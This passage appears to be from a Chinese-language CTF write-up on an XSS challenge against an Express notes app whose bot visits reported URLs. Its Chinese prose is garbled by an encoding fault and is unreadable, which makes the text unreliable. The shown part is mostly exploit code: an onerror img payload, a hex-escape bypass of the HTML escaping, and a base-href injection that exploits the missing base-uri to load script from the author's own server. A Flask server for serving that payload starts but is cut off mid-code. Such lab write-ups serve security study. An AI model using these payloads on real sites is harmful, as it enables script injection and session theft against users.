punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/report"</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> url <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>url    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>url<span class="token punctuation">)</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"Missing url"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> url <span class="token operator">!==</span> <span class="token string">"string"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"Bad request"</span><span class="token punctuation">)</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> result <span class="token operator">=</span> <span class="token keyword">await</span> bot<span class="token punctuation">.</span><span class="token function">visit</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"å‘é€æˆåŠŸ"</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>        res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"An error occurred"</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token constant">PORT</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Server running at http://localhost:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token constant">PORT</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç›´æ¥æ‰¾é™åˆ¶æœ€ä¸¥é‡çš„åœ°æ–¹ï¼Œä¸€èˆ¬æ˜¯æˆ‘ä»¬è¦å®ç° xss çš„åœ°æ–¹ï¼ˆ</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> nonce <span class="token operator">=</span> crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">"hex"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    res<span class="token punctuation">.</span>locals<span class="token punctuation">.</span>nonce<span class="token operator">=</span>nonce<span class="token punctuation">;</span>    res<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">"Content-Security-Policy"</span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">        default-src 'none';        script-src 'nonce-</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>nonce<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">';        style-src 'unsafe-inline';    </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\n</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> listItems <span class="token operator">=</span> notes<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">content<span class="token punctuation">,</span> index</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">        &lt;li style="margin-bottom:15px;padding:10px;border:1px solid #ddd;border-radius:5px;background:#f9f9f9;">            &lt;a href="/note/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>index<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">">Note </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>index<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&lt;/a>            &lt;div id='note-</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>index<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">' class="note-content">&lt;/div>            &lt;form action="/delete/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>index<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">" method="POST" style="display:inline;">                &lt;button type="submit" style="margin-left:10px;background:#ff4d4f;color:white;border:none;border-radius:3px;cursor:pointer;">Delete&lt;/button>            &lt;/form>            &lt;script src="/preview?index=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&amp;content=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">" nonce="</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>res<span class="token punctuation">.</span>locals<span class="token punctuation">.</span>nonce<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">">&lt;/script>        &lt;/li>        </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">    &lt;html>    &lt;head>        &lt;title>ğŸ“’ Notes&lt;/title>        &lt;style>            body &#123; font-family: Arial, sans-serif; margin: 40px; &#125;            textarea &#123; width: 400px; height: 80px; &#125;            button &#123; margin-top: 5px; &#125;            ul &#123; list-style: none; padding: 0; &#125;        &lt;/style>    &lt;/head>    &lt;body>        &lt;h1>ğŸ“’ Notes&lt;/h1>        &lt;form action="/add" method="POST">            &lt;textarea name="content">&lt;/textarea>&lt;br>            &lt;button type="submit">Add Note&lt;/button>        &lt;/form>        &lt;hr>        &lt;ul>            </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>listItems<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">        &lt;/ul>    &lt;/body>    &lt;/html>    </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸ºä»€ä¹ˆä¼šå¯¹ä¸€ä¸ª &#x2F;preview è·¯ç”±é™åˆ¶å‘¢ï¼Œçœ‹çœ‹è¿™é‡Œçš„å®ç°ï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/preview"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">"Content-Type"</span><span class="token punctuation">,</span> <span class="token string">"application/javascript"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> index <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>index<span class="token punctuation">;</span>    <span class="token keyword">let</span> content <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>content <span class="token operator">||</span> <span class="token string">""</span><span class="token punctuation">;</span>    content<span class="token operator">=</span><span class="token function">escapeHTML</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> js <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">    (function()&#123;        const el = document.getElementById('note-</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>index<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">');        if (!el) return;        const text = '</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>content<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">';        if (text.length > 50) &#123;            el.innerHTML = text.slice(0,50) + '...';        &#125; else &#123;            el.innerHTML = text;        &#125;    &#125;)();    </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>js<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç®€åŒ–ä¸€ä¸‹å°±æ˜¯è¿™æ ·çš„ï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>note-0<span class="token punctuation">'</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>note-content<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">    <span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> el <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'note-0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>el<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> text <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>text<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">50</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            el<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> text<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'...'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            el<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> text<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç›´æ¥æ”¹ note-0 è¿™ä¸ª div é‡Œçš„ innerHTMLï¼Œå…¶ä¸­ text æˆ‘ä»¬å¯æ§ï¼Œé‚£ä¹ˆå¾ˆå®¹æ˜“ xssï¼Œåªè¦ä½¿ç”¨é script å’Œ body æ ‡ç­¾çš„ payload æ‰“å°±è¡Œäº†</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>note-0<span class="token punctuation">'</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>note-content<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">    <span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> el <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'note-0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>el<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> text <span class="token operator">=</span> <span class="token string">'&lt;img src onerror="alert(1)">'</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>text<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">50</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            el<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> text<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'...'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            el<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> text<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ¥ä¸‹æ¥é’ˆå¯¹é™åˆ¶è¿›è¡Œç»•è¿‡ï¼Œé¦–å…ˆæ˜¯è½¬ä¹‰ï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">escapeHTML</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> str        <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">&amp;</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">"&amp;amp;"</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">&lt;</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">"&amp;lt;"</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">></span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">"&amp;gt;"</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">"</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">"&amp;quot;"</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">'</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">"&amp;#39;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ³¨æ„è¿™é‡Œæ˜¯åœ¨ nodejs ä¸Šè¿›è¡Œè½¬ä¹‰çš„ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬åªéœ€è¦ä¼ å…¥çš„ content ä¸åœ¨è¿™ä¸ªèŒƒå›´å¹¶ä¸”èƒ½è¢« javscript æ”¯æŒè§£æå³å¯ï¼Œåå…­è¿›åˆ¶ç¼–ç å°±å¯ä»¥å®ç°</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>note-0<span class="token punctuation">'</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>note-content<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">    <span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> el <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'note-0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>el<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> text <span class="token operator">=</span> <span class="token string">'\x3cimg src onerror="alert(1)"\x3e'</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>text<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">50</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            el<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> text<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'...'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            el<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> text<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åæ˜¯ CSPï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> nonce <span class="token operator">=</span> crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">"hex"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    res<span class="token punctuation">.</span>locals<span class="token punctuation">.</span>nonce<span class="token operator">=</span>nonce<span class="token punctuation">;</span>    res<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">"Content-Security-Policy"</span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">        default-src 'none';        script-src 'nonce-</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>nonce<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">';        style-src 'unsafe-inline';    </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\n</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// &lt;script src="/preview?index=$&#123;encodeURIComponent(index)&#125;&amp;content=$&#123;encodeURIComponent(content)&#125;" nonce="$&#123;res.locals.nonce&#125;">&lt;/script></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œè®¾ç½®äº† default-srcã€script-srcã€style-srcï¼Œæ²¡è®¾ç½® base-uriï¼Œé‚£å°±å¯ä»¥ç›´æ¥ç»•è¿‡ï¼Œæ„é€  baseurl åŠ è½½æˆ‘ä»¬ vps ä¸Šçš„ js å®ç° xss</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>note-0<span class="token punctuation">'</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>note-content<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">    <span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> el <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'note-0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>el<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> text <span class="token operator">=</span> <span class="token string">'\x3cbase href=http://192.168.1.154:8000\x3e'</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>text<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">50</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            el<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> text<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'...'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            el<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> text<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¿®æ”¹ä¹‹åæ­¤æ—¶ä» html è®¿é—®çš„æ‰€æœ‰è·¯ç”±éƒ½æ˜¯åœ¨è‡ªå·±çš„ vps ä¸Šï¼Œç”±äºè¿™é‡Œå”¯ä¸€çš„ script src æ ‡ç­¾æ˜¯ <code>&lt;script src=&quot;/preview?index=$&#123;encodeURIComponent(index)&#125;&amp;content=$&#123;encodeURIComponent(content)&#125;&quot; nonce=&quot;$&#123;res.locals.nonce&#125;&quot;&gt;&lt;/script&gt;</code></p><p>é‚£ä¹ˆæˆ‘ä»¬éœ€è¦åœ¨ vps ä¸Šèµ·ä¸€ä¸ªå¸¦æœ‰ &#x2F;preview è·¯ç”±çš„ web æœåŠ¡ï¼Œä½¿å…¶è¿”å› xss payloadï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template_string<span class="token punctuation">,</span> requestapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/preview'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">preview</span><span class="token punctuation">(</span><span class="token 